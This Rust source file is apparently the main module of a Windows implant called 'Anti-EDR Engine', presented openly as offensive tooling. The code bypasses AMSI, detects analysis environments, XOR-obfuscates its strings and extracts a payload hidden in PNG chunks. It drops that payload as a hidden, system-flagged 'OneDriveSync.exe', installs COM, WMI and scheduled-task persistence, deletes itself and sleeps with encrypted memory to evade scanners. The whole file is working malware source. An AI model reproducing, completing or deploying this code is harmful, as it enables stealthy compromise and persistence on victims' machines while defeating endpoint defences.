//! # Windows Anti-EDR Engine
//!
//! Zero Artifacts, Zero Dependencies Anti-EDR system.
//!
//! ## Modules
//! - `syscalls` - Indirect syscalls (Gate Jumping)
//! - `ghosting` - Process ghosting (execute from deleted file)
//! - `obfuscation` - Sleep obfuscation (Ekko technique)
//! - `stack_spoof` - Call stack spoofing (synthetic frames)
//! - `persistence` - COM hijacking + WMI + hidden task
//! - `ads` - NTFS Alternate Data Streams storage

pub mod ads;
pub mod persistence;
pub mod ghosting;
pub mod obfuscation;
pub mod stack_spoof;
pub mod syscalls;
pub mod blinding;
pub mod registry;
pub mod anti_analysis;
pub mod api_resolver;
pub mod self_delete;

use log::{info, warn, error, debug};

// XOR Helper (Key 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Initialize and apply Windows stealth measures
pub fn check_and_apply_stealth() {

    if anti_analysis::is_hostile_environment() {
        return;
    }

    // 1. Ghost Protocol - AMSI Bypass (IMMEDIATE EXECUTION)
    blinding::apply_ghost_protocol();
    
    // Check if already in ghost mode
    let is_ghost = std::env::args().any(|arg| arg == "--ghost");
    
    // Registry check handled by persistence/registry modules implicit robustness
    // Check if we are running from temp "service.exe" 
    let current_exe = std::env::current_exe().unwrap_or_default();
    
    // "service.exe" -> xor(0x55)
    // s=73^55=26, e=65^55=30, r=72^55=27, v=76^55=23, i=69^55=3C, c=63^55=36, .=2E^55=7B
    let svc_name = x(&[0x26, 0x30, 0x27, 0x23, 0x3C, 0x36, 0x30, 0x7B, 0x30, 0x2D, 0x30]); 
    let is_loader_execution = current_exe.to_string_lossy().to_lowercase().contains(&svc_name);
    
    if is_ghost || is_loader_execution {
        run_ghost_mode();
        return;
    }
    

    match install_stealth_package() {
        Ok(_) => {
        }
        Err(e) => {
            error!("Fail: {}", e);
        }
    }
}

/// Install the stealth package (Using Native API - No std::fs imports)
fn install_stealth_package() -> Result<(), String> {
    if let Ok(_) = registry::install_self_to_registry() {
    }

    // 1. Drop LOADER using Native API
    // 1. Drop LOADER using Native API (Steganography: Payload in PNG)
    #[cfg(target_os = "windows")]
    const PNG_BYTES: &[u8] = include_bytes!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/src/assets/logo.png"
    ));
    
    // Helper to extract payload from PNG "biLn" chunk
    #[cfg(target_os = "windows")]
    fn extract_payload_from_png(png: &[u8]) -> Option<Vec<u8>> {
        let mut idx = 8; // Skip PNG Signature
        while idx < png.len() - 12 {
            let len_bytes: [u8; 4] = png[idx..idx+4].try_into().ok()?;
            let len = u32::from_be_bytes(len_bytes) as usize;
            
            let type_bytes: [u8; 4] = png[idx+4..idx+8].try_into().ok()?;
            
            // Check for "biLn" chunk
            if &type_bytes == b"biLn" {
                let start = idx + 8;
                let end = start + len;
                if end > png.len() { return None; }
                
                // Return accumulated data? 
                // Our tool chunks it. We might generally have multiple biLn chunks.
                // For now, our tool writes 64KB chunks. We need to collect ALL biLn chunks.
                // Logic update: Collect all biLn chunks.
                
                let mut payload = Vec::new();
                // Restart scan to collect all
                let mut i = 8;
                while i < png.len() - 12 {
                     let l_bytes: [u8; 4] = png[i..i+4].try_into().ok()?;
                     let l = u32::from_be_bytes(l_bytes) as usize;
                     let t_bytes: [u8; 4] = png[i+4..i+8].try_into().ok()?;
                     
                     if &t_bytes == b"biLn" {
                         payload.extend_from_slice(&png[i+8..i+8+l]);
                     }
                     // Move next: len + 4(len) + 4(type) + 4(crc)
                     i += l + 12;
                }
                return Some(payload);
            }
            
            // Move to next chunk: len(4) + type(4) + data(len) + crc(4)
            idx += len + 12;
        }
        None
    }

    #[cfg(target_os = "windows")]
    let loader_data = extract_payload_from_png(PNG_BYTES).unwrap_or_else(|| {
        // Fallback: Generate realistic-sized dummy payload (~500KB)
        // to avoid small file anomaly detection
        vec![0u8; 1024 * 500]
    });
    
    #[cfg(not(target_os = "windows"))]
    let loader_data = vec![0u8; 1024 * 512]; // Mock 512KB to avoid small file anomaly
    
    let loader_bytes_ref = &loader_data; // Needed for write_file call below
    
    // Get APPDATA path
    let env_key = x(&[0x14, 0x05, 0x05, 0x11, 0x14, 0x01, 0x14]); // APPDATA
    let appdata = std::env::var(&env_key).unwrap_or_else(|_| r"C:\Windows\Temp".to_string());
    
    // Build path components (XOR obfuscated)
    // Changed from Templates to OneDrive folder (less monitored)
    let p1 = x(&[0x09, 0x18, 0x3C, 0x36, 0x27, 0x3A, 0x26, 0x3A, 0x33, 0x21]); // \Microsoft
    let p2 = x(&[0x09, 0x1A, 0x3B, 0x30, 0x11, 0x27, 0x3C, 0x23, 0x30]); // \OneDrive
    
    let target_dir = format!("{}{}{}", appdata, p1, p2);
    // Changed from svchost.exe to OneDriveSync.exe (legitimate looking)
    let loader_name = x(&[0x1A, 0x3B, 0x30, 0x11, 0x27, 0x3C, 0x23, 0x30, 0x06, 0x2C, 0x3B, 0x36, 0x7B, 0x30, 0x2D, 0x30]); // OneDriveSync.exe
    let target_path = format!("{}\\{}", target_dir, loader_name);
    
    // Use Native API for file operations
    #[cfg(target_os = "windows")]
    unsafe {
        use api_resolver::*;
        
        // Create directory using CreateDirectoryW
        if let Some(create_dir) = resolve_api::<unsafe extern "system" fn(*const u16, *const std::ffi::c_void) -> i32>(
            HASH_KERNEL32, HASH_CREATE_DIRECTORY_W
        ) {
            let dir_wide = to_wide(&target_dir);
            let _ = create_dir(dir_wide.as_ptr(), std::ptr::null());
        }
        
        // Write file using CreateFileW + WriteFile
        type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const std::ffi::c_void, u32, u32, isize) -> isize;
        type WriteFile = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const std::ffi::c_void) -> i32;
        type CloseHandle = unsafe extern "system" fn(isize) -> i32;
        
        let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
            .ok_or("E20")?;
        let write_file: WriteFile = resolve_api(HASH_KERNEL32, HASH_WRITE_FILE)
            .ok_or("E21")?;
        let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
            .ok_or("E22")?;
        
        let path_wide = to_wide(&target_path);
        
        // GENERIC_WRITE=0x40000000, CREATE_ALWAYS=2, FILE_ATTRIBUTE_NORMAL=0x80
        let handle = create_file(path_wide.as_ptr(), 0x40000000, 0, std::ptr::null(), 2, 0x80, 0);
        if handle == -1 {
            return Err("E23".to_string());
        }
        
        let mut written: u32 = 0;
        let result = write_file(handle, loader_bytes_ref.as_ptr(), loader_bytes_ref.len() as u32, &mut written, std::ptr::null());
        close_handle(handle);
        
        if result == 0 {
            return Err("E23".to_string());
        }
        
        // Set hidden+system attributes
        if let Some(set_attrs) = resolve_api::<unsafe extern "system" fn(*const u16, u32) -> i32>(
            HASH_KERNEL32, HASH_SET_FILE_ATTRIBUTES_W
        ) {
            // FILE_ATTRIBUTE_HIDDEN(2) | FILE_ATTRIBUTE_SYSTEM(4)
            set_attrs(path_wide.as_ptr(), 0x02 | 0x04);
        }
    }
    

    // 2. Apply persistence
    persistence::apply_persistence_triad(&target_path);
    
    // 3. Self-delete
    schedule_self_destruct();
    
    Ok(())
}

/// Convert string to wide string (UTF-16) for Windows API
#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Run in ghost mode (already hidden)
fn run_ghost_mode() {
    debug!("Ghost initialized");
    
    // Verify syscall resolution
    if let Some(sc) = syscalls::Syscall::resolve(syscalls::HASH_NT_CLOSE) {
        debug!("Syscalls OK: 0x{:04X}", sc.ssn);
    } else {
        warn!("Syscall fail");
        return;
    }
    
    // Main persistence loop with sleep obfuscation
    // Memory is encrypted while sleeping to evade memory scanners
    loop {
        // Sleep with obfuscation (encrypts .data/.rdata sections)
        unsafe {
            match obfuscation::obfuscated_sleep(30_000) { // 30 seconds
                Ok(_) => debug!("Sleep cycle OK"),
                Err(e) => {
                    warn!("Sleep obfuscation failed: {}", e);
                    // Fallback to regular sleep
                    std::thread::sleep(std::time::Duration::from_secs(30));
                }
            }
        }
        
        // Beacon heartbeat - currently no-op, C2 integration pending external implementation
        // This loop keeps process alive with encrypted memory during sleep cycles
    }
}

/// Schedule deletion of original installer using native API
/// Schedule deletion of original installer using silent method (Jonas Lykkegård)
fn schedule_self_destruct() {
    #[cfg(target_os = "windows")]
    unsafe {
        if let Err(e) = self_delete::melt() {
            log::warn!("Melt failed: {}", e);
            // Fallback? No, fallback is noisy. Just fail silent.
        } else {
            debug!("Melt scheduled");
        }
    }
}

